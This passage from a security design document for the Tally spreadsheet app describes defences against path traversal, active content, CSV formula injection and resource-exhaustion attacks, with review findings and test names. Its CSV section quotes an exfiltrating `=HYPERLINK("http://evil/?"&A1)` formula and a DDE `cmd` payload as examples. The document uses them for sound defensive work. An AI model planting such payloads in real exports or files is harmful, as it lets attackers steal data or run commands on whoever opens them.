  `font_list_*`, `fonts::tests::listing_reads_metadata_only`.

### Files from the OS (review M3, M4, L4)

Files handed over by Finder (`RunEvent::Opened`), Open With, or a second
launch (`tauri-plugin-single-instance` =2.5.5, no JS API or permission;
it forwards the second instance's argv and quits it) are opened by
`dialogs::open_os_files`: at most `MAX_OS_OPEN_BATCH` (32) per request
without asking (a native question offers to open the first 32), one after
another in one task (never one task per file), after joining the
`wb_open` allowlist (the user chose them). Before any document webview has
started they wait for the first one, which opens them through its normal
open path (lock questions, already-open check), the first in place of its
untouched blank workbook. Save As: when the extension Tally adds to a typed
name (`Report.xlsm` → `Report.xlsx`) names an existing file the panel did
not check, a native question asks before replacing it (on macOS the panel
already enforces its allowed extensions itself).

## 4. Path traversal (WP5)

- Nothing is ever extracted to disk. Entries are streamed into memory by exact
  name.
- Entry names are ignored if they are absolute, contain `..` components,
  backslashes, NUL bytes or drive letters (`:`). Ignoring a name is not an
  error, so a document with a hostile `../content.xml` and a real
  `content.xml` still opens from the real one.
- On write, entry names are fixed constants.

| Test | What it proves |
|---|---|
| `tally-io-ods::malicious::traversal_entry_names_are_ignored` | The hostile `../content.xml` and the DOCTYPE in `a/../../styles.xml` are never read |
| `tally-io-ods::archive::tests::unsafe_names` | Name classification |
| `tally-io-ods::roundtrip::mimetype_is_first_and_stored` | The writer emits exactly the fixed entry list, with `mimetype` first and stored |

## 5. Active content

File side (WP5):

- The ODS reader reads only `mimetype`, `META-INF/manifest.xml`,
  `content.xml`, `styles.xml`, `settings.xml` and `meta.xml`. `Basic/` macros,
  `Scripts/`, embedded objects and `office:scripts` are never read, so they
  cannot run.
- Encrypted (password-protected) documents are refused with
  `OdsError::Unsupported`.
- Formula text such as `WEBSERVICE` or `DDE` is passed through as text. It is
  never evaluated by the reader.
- CSV import never creates formulas: a field such as `=1+2` or
  `=HYPERLINK(…)` is imported as the text `=1+2` (AOO's "Evaluate formulas"
  import option is also off by default). Numbers, dates and percentages are
  still recognised. `tally_io_csv::CsvOptions::evaluate_formulas` (default
  `false`) is the opt-in for a later import dialog; the engine's
  `Workbook::from_data_opts(data, recognize, formulas)` implements it. Test:
  `tally-engine::security::files::csv_formulas_import_as_text` (the review's
  `slow.csv` took 3.1 s and 935 MB to open before).

Other WPs:

- Disabling external links, DDE, `WEBSERVICE` and `FILTERXML` by default, and
  opening `HYPERLINK` only on explicit click through Rust for
  http/https/mailto, belong to WP1 (engine), WP3 (functions) and WP7 (app).
- The macro banner is WP7.

## CSV formula-injection guard (WP5, `tally_io_csv::write_csv`, default ON)

Why the guard exists:

- When a CSV file is opened in Excel, LibreOffice or Google Sheets, a field
  that starts with `=`, `+`, `-` or `@` is evaluated as a formula. Tab and
  carriage return can hide such a prefix in some importers.
- An attacker who can put text into a cell (a form field, a product name, a
  synced row) can make an exported CSV run a formula on whoever opens it.
  Examples are `=HYPERLINK("http://evil/?"&A1)`, which exfiltrates neighbouring
  data, and DDE payloads such as `=cmd|' /C calc'!A0`.
- This is OWASP's "CSV Injection".

What the guard does:

- When `CsvWriteOptions::injection_guard` is true (the default), a field gets
  a leading `'` if its *output text* starts with tab or CR, or if its first
  character after leading whitespace (including LF and NBSP) and `"`
  characters is `=`, `+`, `-`, `@` or a full-width form (`＝ ＋ － ＠`,
  which some CJK-locale importers normalize).
- The decision is made on the text that is written, whatever the cell's
  type (`CsvCell::is_text` is informational only). A number format can make
  a number display as `=HYPERLINK("http://evil/?"&A1)+5`; before the
  2026-10-19 review (H3) such a number was written unguarded.
- Spreadsheet apps treat a leading `'` as "this is text" and hide it in the
  cell.

What it does not touch:

- A field that is entirely a plain numeric literal (`tally_io_csv::is_plain_number`):
  optional spaces, an optional sign, digits with optional `,` thousands
  separators, at most one decimal point, an optional exponent and an optional
  trailing `%`. So `-5`, `-1,234.50`, `+1E+10` and `-12%` stay as they are.
- Text that merely contains `=` later on.

The cost:

- The guard changes the bytes of some legitimate fields, such as `-foo`,
  `@handle`, and also currency-looking text like `-$5.00` (it starts with
  `-` and is not a plain numeric literal, so it is written `'-$5.00`; the
  importer shows it as the text `-$5.00`). This trade-off is deliberate.
- Users who need byte-exact output can switch the guard off
  (`CsvWriteOptions::injection_guard = false`; export dialog toggle, WP7).

Tests: `tally-io-csv::csv::injection_guard` (every trigger, the
`"`-prefixed variant and the toggle), `tally-io-csv::csv::injection_guard_applies_to_output_text`
(number-format injection, `-5 or 1=1`, `-$5.00`, leading whitespace/LF,
full-width triggers, plain numbers) and
`tally-engine::security::files::csv_export_guards_formatted_numbers` (the
review's `csvinj.ods` end to end).

CSV export walks sparse storage (security review M7): rows are padded to the
used width only when the whole rectangle is at most 10,000,000 fields;
otherwise each row stops at its last cell and empty rows are bare line
breaks. An export that would still write more than 10,000,000 fields is
refused (`unsupported`). Test: `tally-engine::security::files::csv_export_is_sparse_and_capped`
(values at A1 and XFD1048576 export in well under a second; the dense walk
needed 17 G entries before).

CSV import never interprets content. Cells come back as raw text
(`tally-io-csv::csv::values_are_raw_text` keeps `=SUM(A1)` as text), and the
engine's input recognizer turns them into numbers, dates and so on, but
never into formulas (see §5).

## 6. Untrusted parsing happens in Rust only

- WP5: both readers are pure Rust with `#![forbid(unsafe_code)]`. Neither
  uses `unwrap` or `expect` outside tests, and both produce typed
  `tally_model` data.
- `tally-io-ods::malicious::mutated_inputs_never_panic` runs truncations and
  random byte flips of a real fixture and checks that none of them panics or
  hangs.
- WP7 owns the guarantee that the webview receives typed DTOs and never raw
  file contents. That includes the size-limited image blobs.

## 7. Tauri hardening: WP7

Minimal capabilities (no fs or shell plugins exposed to JS, dialog only from
Rust commands), an allowlist of our commands only, a strict CSP and devtools
off in release builds are all owned by WP7 (`apps/desktop/**`).

## 8. Engine DoS: WP1, WP2, WP3

| Control | Test |
|---|---|
| Parser depth and length limits: formula length at most 8,192 characters, nesting at most 256 (Err:512). Owned by WP2. | `tally-formula` tests |
| Regex size limit through `RegexBuilder::size_limit`, with no fancy-regex in criteria. Owned by WP3. | `tally-functions::criteria` tests |
| Text results are capped at 4 MiB (`tally_functions::MAX_TEXT_BYTES`): every function result passes through `sanitize`, the `&` operator checks before allocating, and SUBSTITUTE and CONCATENATE size their result first. Longer text is Err:513 (string overflow). | `tally-engine::security::nested_substitute_hits_string_cap` (9 nested SUBSTITUTEs: 2.2 GB before), `tally-engine::security::substitute_checks_size_before_allocating`, `tally-engine::security::concat_hits_string_cap` |
| Wildcard criteria never backtrack: the pattern is split at `*` into pieces matched greedily (literal pieces by substring search, pieces with `?` by bit-parallel Shift-And). Worst case O(text × piece / 64). | `tally-functions::criteria::tests::glob_agrees_with_reference`, `tally-functions::criteria::wildcard_matching_is_linear`, `tally-engine::security::wildcard_countif_is_linear` (1 MB × 4,000-character pattern: 3.2 s before) |
| Recalc watchdog on open: at most 50,000,000 formulas or 20 s (`RecalcBudget::on_open`). Past it, the remaining formulas keep the values cached in the file, are marked clean (so edits recalculate their dependents as usual), and `WorkbookInfo.warnings` carries a one-time message that the app shows as a toast. `apply` is bounded per transaction (below) and per formula (work budget), not by time. | `tally-engine::security::recalc_budget_stops_and_keeps_cached_values`, `tally-engine::security::files::heavy_open_stops_at_deadline_with_warning` |
| Names are evaluated by reference, never inlined: each definition reachable from a formula is kept once (`names::collect_names`), evaluated where it is used (relative references stay relative to the using cell), memoized per cell evaluation (`eval::EvalEnv`), with cycle detection and at most 16 nested names (`#NAME?`). Dependency analysis visits each reachable definition once. A 1 KB file with 16 levels of fan-out 10 opens in milliseconds. | `tally-engine::security2::fan_out_names_open_in_linear_time`, `tally-engine::security2::fan_out_names_through_the_api`, `tally-engine::security2::names_by_reference_keep_semantics` |
| Per-formula work budget: 50,000,000 element operations per cell evaluation (`eval::MAX_FORMULA_WORK`). Every evaluation step costs 1, an operator or call over arrays or ranges the cells it touches (the used part for functions that scan ranges), `MMULT` rows × inner × columns, `MINVERSE`/`MDETERM` n³, `MUNIT` n². A formula over budget is Err:512 ("formula overflow": too complex to evaluate), charged before the work runs. | `tally-engine::security2::matrix_work_budget_stops_huge_mmult` |
| Dependency index: the readers of a cell are a list with a back-index (each formula records its list positions), so registering or removing one reader is O(1) however many formulas read the cell; name users are a hash set. | `tally-engine::deps::tests::many_readers_of_one_cell_stay_linear`, `tally-engine::security2::fan_in_is_linear`, `tally-engine::security2::indirect_fan_in_edit_is_linear` (release: `fan_in_200k_release_timing`, `indirect_fan_in_100k_release_timing`) |
| Per-transaction budget: the ops of one `apply` may touch at most 50,000,000 cells (`ops::MAX_TX_CELLS`, summed with `ops::op_cost`: cells written or moved, the used part of cleared or sorted ranges, one per column for style ops, the larger of target and clipboard block for pastes, the sheet's stored cells (at most 1,000,000) per Replace All, the used area times the targets for Fill Sheets). An op past it fails with `unsupported`; the rest of the transaction applies (with a multi-sheet `group`, every repeated op counts and the whole transaction is refused). The shell caps `Transaction.group` and Fill Sheets targets at 256 sheets (`limits::MAX_GROUP_SHEETS`) and counts each repeated op against `MAX_OPS` and the structural-op limit; the engine expands a group lazily. | `tally-engine::security2::transaction_cell_budget` |
| Replace All: replacement and pattern at most 64 KiB (`find::MAX_PATTERN_BYTES`, checked before compiling), at most 1,048,576 cells per op and 10,000,000 per transaction (`find::MAX_REPLACE_TX`, the undo record holds every old cell), at most 32,767 characters per replaced cell (longer results leave the cell unchanged, with a warning) and 256 MiB of new text per op. | `tally-engine::security2::replace_all_limits`, `tally-engine::security2::huge_find_pattern_is_refused_early` |
| Number formats at most 4,096 characters (`tally_model::MAX_NUMBER_FORMAT_LEN`): `SetNumberFormat`, `ApplyStyle` and conditional-format styles refuse longer codes, the style table turns longer codes from any source into General, and `cells()` returns at most 1,024 characters of display text per cell (`service::view::MAX_VIEW_TEXT`, ending in `…`; the value, edit text and exports are untouched). | `tally-engine::security2::files::long_number_formats_render_fast` (release: `long_number_formats_render_100ms_release`) |
| AutoFilter value lists are matched through a hash set of lowercased values built once per application (`filter::Matcher`); a list holds at most 100,000 values and 16 MiB (`filter::MAX_FILTER_VALUES`). | `tally-engine::security2::filter_value_list_is_a_set` (release: `filter_100k_rows_10k_values_release_timing`) |
| Loading: overlapping merges are dropped in O(n log n) (a row sweep, `convert::clean_merges`), at most 100,000 per sheet; array blocks cover at most 10,000,000 cells per workbook (`convert::MAX_ARRAY_CELLS`), checked before anything is materialized; imported sheet names are made valid (`convert::sanitize_sheet_name`: `[ ] * ? : / \` and control characters become `_`) while the file's formulas still resolve the original names. What loading drops or changes is shown once as a warning. | `tally-engine::convert::tests::clean_merges_is_n_log_n`, `tally-engine::convert::tests::clean_merges_drops_overlaps_and_invalid`, `tally-engine::convert::tests::array_budget_is_checked_before_materializing`, `tally-engine::security2::files::many_merges_open_fast`, `tally-engine::security2::imported_sheet_names_are_sanitized` (release: `engine_array_budget_release`) |
| At most 10,000 sheets per workbook (`workbook::MAX_SHEETS`), and sheet names are made unique in amortized O(1) (`SheetNamer`), so loading is linear in the sheet count. Only the first unnamed sheet takes the file name. | `tally-engine::security::same_named_sheets_load_fast` (2,000 same-named sheets: 43 s before), `tally-engine::security::sheet_count_is_capped`, `tally-engine::security::files::same_named_sheets_open_fast` |
| Maximum array size (2^21 elements per lifted range). | engine eval tests |
| Conditional formats per `cells()` call: at most 2,048 formats per sheet with 64 ranges each (`condfmt::MAX_CF_PER_SHEET`, `MAX_CF_RANGES`; readers and `AddConditionalFormat` drop extras with a warning); a range index per sheet and document version finds the formats covering a cell in O(log n + k) (`rangeindex::RangeIndex`, identical rectangles stored once); absolute subexpressions of rule formulas (`SUM($A:$A)`) are folded to literals once per version (`FExpr::fold_absolute`); evaluated cells are cached per version; rules whose style adds nothing to higher rules are skipped; and each call has a work budget of 8,000,000 element operations plus 20 per rule evaluation (`condfmt::MAX_CF_WORK_PER_CALL`, `RULE_COST`, about 80 ms of rule evaluation in a release build), past which the remaining cells of the call are left unformatted and `CellBlock.cf_truncated` is set. | `tally-engine::security3::stacked_identical_rules_render_within_the_budget`, `cf_budget_truncates_and_flags_the_block`, `range_index_handles_many_disjoint_blocks`, `absolute_subexpressions_are_evaluated_once_per_version`, `loaded_conditional_formats_are_capped_with_warnings` (release: `cf_viewports_render_under_100ms_release`) |
| Sheet meta undo: every `SheetMeta` collection is behind an `Arc` and edited copy-on-write; an undo entry holds only the collections an op changed (`Change::Meta`, pointer identity before/after) and note/link edits record the replaced entries (`ops_v03::with_meta_cells`), so undo memory scales with what was touched. A transaction holds at most 100,000 meta ops and 64 MiB of note text (`ops_v03::MAX_META_OPS_PER_TX`, `MAX_NOTE_BYTES_PER_TX`). See "Sheet meta copy-on-write" under Review 3. | `tally-engine::security3::many_note_ops_in_one_transaction_record_single_entries`, `single_note_edits_on_a_large_sheet_share_the_map`, `meta_ops_record_only_the_touched_collections`, `failing_meta_ops_leave_the_meta_untouched`, `meta_ops_per_transaction_are_capped` (release: `note_transactions_release_timing`) |
| Undo memory (review 5 LOW-1, 2026-11-09): the undo depth is 1–1,000 steps (`UNDO_DEPTH_RANGE`, default 100; `set_undo_depth` is callable from any window), so the per-step budgets in this table could add up to 10× what 100 steps hold. The stacks therefore also keep an approximate byte weight per step (`undo::record_weight`: captured cells × 96 bytes, style runs, pivot label cells / grid lines / values, note and link entries, cell-style and name tables, a constant per other meta part; shared `Arc`s are counted as owned, so it errs high) and hold at most `undo::UNDO_BUDGET` = 1 GiB per document, undo and redo together: past it the oldest undo steps are dropped, then the redo steps farthest from the current state; the newest undo step always stays, however large (its own size is bounded by the per-transaction limits above). | `tally-engine::undo::undo_stack_byte_budget_trims_oldest` |
| Validation per op: list sources are resolved once per op into a hash set of normalized keys (shared by every validation with the same absolute source range, `validation::Checker`), custom and comparison formulas have their absolute parts folded once per op, the written cells are matched to validations through a range index, and each op checks at most 2,000,000 cells within 50,000,000 element operations (`validation::MAX_VALIDATION_CELLS_PER_OP`, `MAX_VALIDATION_WORK_PER_OP`); past that the remaining cells are accepted with a notice in `ApplyResult.warnings`. | `tally-engine::security3::list_validation_resolves_the_list_once_per_op`, `custom_validation_folds_absolute_parts_once_per_op`, `validation_budget_accepts_the_rest_with_a_notice` |
| Protection records: OOXML `spinCount` clamped to 100,000 (`protection::MAX_SPIN_COUNT`, in the reader and in `verify`), hash/salt/key values over 1 KiB dropped at load (the sheet stays protected and any password unlocks it, as for an unknown algorithm). Imported notes are cut at 32 KiB (`ops_v03::MAX_NOTE_LEN`) and limited to 64 MiB per workbook (`convert::MAX_NOTE_BYTES_PER_WORKBOOK`); imported links go through `check_url` (script/data links, control characters, over 8 KiB are dropped), each with a one-time warning. XLSX hyperlink targets over 8 KiB are dropped when the relationships are parsed, the URL is one `Arc<str>` per `ref`, expanded link cells count against `max_cells` and stop at 100,000 per sheet, and relationship ids are looked up in a hash map. | `tally-engine::security3::spin_count_is_clamped_and_long_hashes_dropped`, `imported_notes_and_links_are_capped`; `tally-io-xlsx::security3::*`; `tally-io-ods::security3::*` |
| Charts and pictures: picture bytes shared between frames (`Arc<[u8]>`) and at most 256 MiB per document counted per reference; at most 1,000 charts, 32,000 series and 1M literal points per document (readers and load, counted per reference; `AddChart`/`UpdateChart` refuse past the series budget); each `chart_data` visits at most 2M cells (hidden ones included) and returns at most 100,000 points and 500 trend points per series, cached per document version; XLSX saves cache at most 1M chart cells and no range over 32,000 cells. See "Review 4 fixes". | `tally-engine::charts_review4`, `tally-io-ods::charts_review4`, `tally-io-xlsx::charts_review4` |

The file readers' own cap of 10,000,000 cells (above) bounds what reaches the
engine.

Residual risk: the text cap applies per value, so an array formula over a
whole column of 4 MiB strings can still build large arrays (bounded by the
array cap × 4 MiB); the work budget counts cells, not bytes. The work budget
is charged by the engine evaluator before each operator and call, so a
single function call is bounded by its arguments' size, not interrupted
while it runs (the lifted scalar calls inside `tally-functions` are capped
at 2^21 cells each). Nothing interrupts evaluation by time, and there is no
cancellation from the UI.

The desktop shell gives every document its own engine service and lock
(`apps/desktop/src-tauri/src/state.rs`, `commands.rs` `with_doc`), so a slow
operation on one document blocks only further commands on that document;
other windows stay responsive, and opening a file runs with no lock held.
The budgets above bound how long one document stays busy. The lock order is
documented in `state.rs`.

## Review 2 fixes

From `docs/reviews/security-review-2-2026-10-19.md`. Timings are the
review's generators (`p*.py`) on the same machine, release build, before
(current HEAD before the fixes) and after.

| Finding | Fix | Tests | Before → after |
|---|---|---|---|
| CRITICAL-1 names expand exponentially | Names evaluated by reference with a per-evaluation memo and cycle detection; analysis visits each definition once (§8) | `tally-engine::security2::fan_out_names_open_in_linear_time`, `fan_out_names_through_the_api`, `names_by_reference_keep_semantics` | fan 10 × 16, 1 cell: timeout > 30 s (1.8 GB) → 2 ms, 9 MB; fan 2 × 1000 cells: 16.3 s → 15 ms; API DefineName fan 10: killed at 6 GB → 0.3 ms |
| HIGH-1 `clean_merges` O(n²) | Row sweep with an ordered map of active merges; 100k merges per sheet in both readers, counted against `max_cells` (XLSX too) | `tally-engine::convert::tests::clean_merges_is_n_log_n`, `tally-engine::security2::files::many_merges_open_fast`, `tally-io-ods::security2::merges_per_sheet_are_capped`, `tally-io-xlsx::security2::merges_are_counted_and_capped` | ODS 200k: 5.2 s → 0.1 s; XLSX 2M: timeout > 30 s → 0.49 s |
| HIGH-2 array blocks unbudgeted | Readers count block areas against `max_cells`; the engine caps covered cells at 10M per workbook and checks overlap before materializing | `tally-io-ods::security2::array_block_areas_count_against_the_cell_cap`, `tally-io-xlsx::security2::array_block_area_counts`, `tally-engine::convert::tests::array_budget_is_checked_before_materializing` | 20 × 1M: 3.1 s, 1.8 GB → refused in 0.4 ms; 200 × 1M: timeout, 3.6 GB → refused in 0.6 ms |
| HIGH-3 dependency index O(n²) | Reader lists with back-index positions and `swap_remove`; name users in a hash set | `tally-engine::deps::tests::many_readers_of_one_cell_stay_linear`, `tally-engine::security2::fan_in_is_linear`, `indirect_fan_in_edit_is_linear` | 200k fan-in: open 5.6 s + recalc_all 23.3 s → 0.32 s + 0.13 s; 100k INDIRECT: setup 7.5 s, edit 6.0 s → 0.3 s, 0.14 s |
| HIGH-4 long number formats | 4,096-character cap in both readers (General + warning), in `SetNumberFormat`/`ApplyStyle`/CF styles and the style table; view text ≤ 1,024 characters per cell | `tally-io-ods::security2::over_long_number_formats_become_general`, `tally-io-xlsx::security2::over_long_format_codes_become_general`, `tally-engine::security2::files::long_number_formats_render_fast` | `cells(A1:T1000)`, 1 MB `0…` code: timeout > 30 s, 3.3 GB → 9 ms, 20 MB; quoted: timeout, 3.8 GB → 9 ms |
| HIGH-5 AutoFilter O(rows × values) | Hash set of lowercased values per application; list size capped | `tally-engine::security2::filter_value_list_is_a_set` | 100k rows × 10k values: 11.7 s → 13 ms |
| MEDIUM-1 shared formulas 450× | `CellContentData::SharedFormula` (one `Arc<str>` per group, counted once); the engine parses each group once and shares the AST; `<f>` text capped at 8,192 | `tally-io-xlsx::security2::shared_formula_members_share_one_text`, `tally-engine::security2::files::shared_formulas_parse_once` | 1M members (LEN 150): open 21.5 s / 4.4 GB (killed at 6 GB here) → open 5.8 s, 744 MB |
| MEDIUM-2 `<col style>` amplification | One whole-column run per column, overlaps last-wins, ≤ 16,384 `<col>` elements | `tally-io-xlsx::security2::column_styles_are_one_run_per_column` | 10k elements: 6.6 s, 2.5 GB → 7 ms, 13 MB |
| MEDIUM-3 single-formula cost | Per-formula work budget (Err:512) | `tally-engine::security2::matrix_work_budget_stops_huge_mmult` | 20 × MMULT(1448²): 46 s → refused before multiplying |
| MEDIUM-4 per-transaction work | 50M-cell transaction budget; Replace All caps | `tally-engine::security2::transaction_cell_budget`, `replace_all_limits` | 64 × 1M SetArrayFormula: ops past 50M cells refused |
| LOW-1 ODS writer merge lookups | Sorted, merged spans per row with binary searches | `tally-io-ods::security2::writer_merge_lookups_are_logarithmic` | — |
| LOW-2 sheet names / `'a:b'!A1` | Imported names sanitized (originals resolve while loading); quote-aware placeholder for `:` in XLSX formula translation | `tally-engine::security2::imported_sheet_names_are_sanitized`, `tally-io-xlsx::security2::quoted_sheet_names_with_colons` | `='a:b'!A1`: `#VALUE!` → 100; `SUM('a:b'!A:A)`: Err:501 → 100 |
| LOW-3 1 MB find pattern | Patterns and replacements over 64 KiB refused before compiling | `tally-engine::security2::huge_find_pattern_is_refused_early` | 640 MB peak → refused at once |
| INFO iterateCount, sheet lookups | Clamped to 32,767; case-insensitive sheet lookup lowercases once | `tally-io-xlsx::security2::iterate_count_is_clamped`, `tally-io-ods::security2::iteration_steps_are_clamped` | — |

Not covered here: the shell-side argument limits (`src/limits.rs`, owned by
the shell) and per-document locks (planned, see §8).

## Review 3 fixes

From `docs/reviews/security-review-3-2026-10-20.md`. Timings are the
review's generators and probe (`scratchpad/sec3`) on the same machine,
release build without LTO, before and after; "viewport" is
`cells(A1:T1000)`.

| Finding | Fix | Tests | Before → after |
|---|---|---|---|
| CRITICAL-1 CF evaluated per viewport fetch, no budget | Range index per sheet/version (identical rectangles stored once), folded absolute subexpressions once per version, per-cell outcome cache per version, rules that cannot contribute are skipped, 8M-unit work budget per `cells()` call with `CellBlock.cf_truncated`, caps 2,048 formats × 64 ranges (§8) | `tally-engine::security3::stacked_identical_rules_render_within_the_budget`, `cf_budget_truncates_and_flags_the_block`, `range_index_handles_many_disjoint_blocks`, `absolute_subexpressions_are_evaluated_once_per_version`, `loaded_conditional_formats_are_capped_with_warnings`, `tally-engine::rangeindex::tests`, `tally-engine::fexpr::tests::absolute_subexpressions_fold_to_literals` | 10k `[.A1]>0` ODS: > 60 s → 73 ms (2,048 kept, warning); 10k XLSX `expression`: 55 s → 46 ms; 1k stacked XLSX: 5.5 s → 47 ms; 1k × 1,024 ranges ODS: 36 s → 73 ms (64 ranges kept per format); 10k × 8 KiB formulas: 6.5 s → 31 ms; `SUM($A:$A)>A1` over 1M numbers: > 60 s → 38 ms first fetch, 2 ms cached; 10k via API: 56 s → 91 ms (2,048 kept) |
| CRITICAL-2 whole-meta clones on undo | `SheetMeta` collections behind `Arc` with copy-on-write, `Change::Meta` holds only changed collections (pointer identity), notes/links undone per entry, meta ops and note bytes per transaction capped; "How to add a meta op" at the top of `ops_v03.rs` | `tally-engine::security3::many_note_ops_in_one_transaction_record_single_entries`, `single_note_edits_on_a_large_sheet_share_the_map`, `meta_ops_record_only_the_touched_collections`, `failing_meta_ops_leave_the_meta_untouched`, `meta_ops_per_transaction_are_capped` | 10k `SetNote` in one tx: 1.25 s, 5.8 GB → 13 ms, 28 MB; 100 note edits on 100k notes: +13 MB each, 1.37 GB → 83 MB total (+0.1 MB each); 20 note edits on 1k × 1,024 CF: +16 MB each → +0; 100k `SetLink`: killed at 4.1 GB → 99 ms, 196 MB; 10k `AddValidation`: killed at 6 GB → 131 ms |
| HIGH-3 XLSX hyperlink expansion | Targets > 8 KiB dropped at `.rels` parse, `LinkData.url: Arc<str>` shared per `ref`, expanded cells count against `max_cells` (then stop, file still opens), 100k links per sheet before expanding, `HashMap` relationship lookup (MEDIUM-6) | `tally-io-xlsx::security3::over_long_hyperlink_targets_are_dropped_at_parse_time`, `hyperlink_expansion_is_capped_per_sheet`, `relationship_lookup_is_a_hash_map`; `tally-io-ods::security3::repeated_links_share_one_url` | 8 MB target × 10k cells: killed at 6.6 GB → 37 ms, 31 MB; 1 MB target: 2.9 s, 2.6 GB → 5 ms, 11 MB; 64 KB target: 794 MB → 9 MB; 100k refs × 10k cells: > 60 s, 1.8 GB → opens in 0.15 s with the first 100k links; 100k relationships: 8.8 s → 109 ms |
| HIGH-4 validation cost | List sets resolved once per op (shared per source range), folded formulas, range index, per-op budget with a notice | `tally-engine::security3::list_validation_resolves_the_list_once_per_op`, `custom_validation_folds_absolute_parts_once_per_op`, `validation_budget_accepts_the_rest_with_a_notice` | 10k-item list + fill 100k: > 60 s → 21 ms; custom `SUM($B:$B)>A1` over 1M, fill 10k: 30.9 s → 9 ms; 10k list validations from a file, fill 100k: 2.9 s → 10 ms |
| MEDIUM-5 `spinCount` / hash sizes | Clamp 100,000 in the reader and in `ooxml_hash`; hash/salt/key > 1 KiB dropped (reader and load) | `tally-engine::security3::spin_count_is_clamped_and_long_hashes_dropped`, `tally-io-xlsx::security3::spin_count_is_clamped_and_long_hash_material_dropped`, `tally-io-ods::security3::long_protection_keys_are_dropped` | unlock attempt at spin 4,294,967,295: 3.1 s → 31 ms; 16 MB salt: 357 ms per attempt → 2 µs |
| MEDIUM-8 note text | Imported notes cut at 32 KiB (ODS, XLSX and load), 64 MiB per workbook, warnings | `tally-engine::security3::imported_notes_and_links_are_capped`, `tally-io-ods::security3::long_notes_are_truncated`, `tally-io-xlsx::security3::long_comments_are_truncated` | 33.5 MB note: loaded whole → 32 KiB |
| LOW-9 protection gaps | `SetPageSetup`/`SetPageBreak` need `format_cells` on a protected sheet (`SetFrozen` and `RefreshFilter` stay allowed: view state); `DefineName`/`DeleteName` need an unprotected document structure; `ProtectSheet`/`UnprotectSheet`/`ProtectDocument`/`UnprotectDocument` clear the undo and redo stacks (not undoable, as Excel); `find` with `in_formulas` skips hidden formulas on protected sheets | `tally-engine::security3::protection_gates_page_setup_names_undo_and_find`, `tally-engine::v03::sheet_and_cell_protection`, `structure_protection` | undo after protect unprotected the sheet → nothing to undo |
| LOW-10 imported hostile links | `check_url` at load for both formats (dropped with a warning) | `tally-engine::security3::imported_notes_and_links_are_capped` | 13 hostile targets loaded → 7 dropped (`javascript:`, `data:`, `vbscript:`, control characters, over 8 KiB) |
| LOW-12 undo of `DeleteSheet` | The record snapshots the conditional formats and validations of the other sheets (cheap `Arc`s) | `tally-engine::security3::undo_of_delete_sheet_restores_rule_formulas` | `SUM(#REF!)` after undo → `SUM(Other.A:A)` |

MEDIUM-7 (dev mock in the bundle) and LOW-11 (Windows `open_url`) are
shell/UI fixes, owned by `apps/desktop` and `packages/app`.

### Sheet meta copy-on-write

`SheetMeta` (`crates/tally-engine/src/storage.rs`) keeps every per-sheet
collection that is not cells (merges, AutoFilter, conditional formats,
validations, notes, links, protection, page setup, breaks, charts,
pictures, pivots, outline groups, scenarios, database ranges, filters,
view options) behind an `Arc`. Cloning the meta is a handful of
reference-count increments; an op edits a collection with
`Arc::make_mut`, which copies it once if an undo record still holds the
previous version and otherwise edits in place. `Vec` collections of large
elements (formats, validations, charts, pictures, pivots, scenarios) hold
`Arc<T>` elements, so adding one format copies 2,048 pointers rather than
2,048 parsed formulas.

Undo records are `Change::Meta { sheet, parts }` where each `MetaPart` is
one field's previous value. `ops_v03::with_meta` snapshots every field
(pointer copies) before the op's closure runs, compares pointers
afterwards and keeps only the fields that changed; fields already recorded
earlier in the same transaction are not snapshotted again
(`Effects::meta_recorded`), so a transaction of 10,000 note edits records
10,000 one-entry parts and edits the map in place. Notes and links use
`with_meta_cells`, which records the previous value of the touched cells
instead of the map, so one note edit on a sheet with 100,000 notes costs
one entry. Ops outside `ops_v03` that touch the meta record only the
fields they change through `undo::meta_parts`. Every op that fails
restores the fields it snapshotted; an op must therefore validate before
it mutates a field that an earlier op of the same transaction already
recorded (the rule is spelled out in the `ops_v03.rs` module
documentation, "How to add a meta op", which the chart, pivot and print
work follows). Adding a field means one struct field and one line in the
`meta_parts!` table.

## Review 4 fixes

From `docs/reviews/security-review-4-2026-10-21.md` and
`docs/reviews/correctness-review-4-2026-10-21.md`. Timings are the
review's generators and probe (`scratchpad/sec4/gen5.py`, `gen5x.py`,
`probe5`) on the same machine, release build, before (8bc43f7) and after,
with a 2.0–2.5 GB RSS watchdog ("killed") because other builds ran at the
same time.

| Finding | Fix | Tests | Before → after |
|---|---|---|---|
| C1 shared pictures copied per frame, 256 MiB counted once | `ImageData.bytes` is an `Arc<[u8]>`: the ODS (`frame.rs`) and XLSX (`drawing_read.rs`, now document-wide) readers read each picture once and every frame shares it; the 256 MiB total (`tally_model::MAX_TOTAL_IMAGE_BYTES`) counts every reference in both readers and again in the engine on load (`charts::from_data`, as `images::from_api` does), with a warning | `tally-io-ods::charts_review4::shared_picture_is_read_once_and_counted_per_frame`, `tally-io-xlsx::charts_review4::shared_media_is_read_once_and_counted_per_anchor`, `tally-engine::charts_review4::loaded_pictures_are_counted_per_reference` | ODS 1,000 frames → 1 MiB PNG: 1.48 GB → 12 MB (256 kept); 1,000 → 16 MiB: killed at 2.2 GB → 0.2 s, 65 MB (16 kept); 20 sheets × 1,000: killed → 15 MB; XLSX 1,000 anchors → 16 MiB: killed at 2.6 GB → 65 MB |
| C2 literal data padded to 32,000 × 255, shared object re-parsed per frame | ODS `local-table` rows keep only real values (trailing empty cells and rows dropped, empty rows allocate nothing); `local-table` addresses of own-data charts (T18) read at most the table's rows and 32,000 cells per address; XLSX `numLit`/`strLit` fill at most `min(ptCount, 4 × pts + 64)` slots; each chart object/part is parsed once per document and sheet and shared by its frames; literal points (`MAX_LITERAL_POINTS` = 1M) and series (`MAX_SERIES_PER_DOCUMENT` = 32,000) are budgeted per document, counted per reference, in both readers and on engine load; `AddChart`/`UpdateChart` refuse to pass the series budget | `tally-io-ods::charts_review4::empty_local_table_rows_hold_no_points`, `local_table_values_are_budgeted_per_document`, `tally-io-xlsx::charts_review4::literal_padding_is_bounded_and_shared_parts_are_budgeted`, `dense_literals_keep_their_indices`, `tally-engine::charts_review4::loaded_literals_and_series_are_budgeted`, `add_chart_respects_the_series_budget` | `lb1.ods`: 843 MB, `chart_data` 62 MB JSON → 10 MB, 0 points; `lb1000.ods`: killed at 2.9 GB → 0.4 s, 127 MB; `xch1.xlsx`: 844 MB → 10 MB; `xch1000.xlsx`: killed at 2.0 GB → 0.2 s, 130 MB (`charts()` 66 MB → 9 MB JSON) |
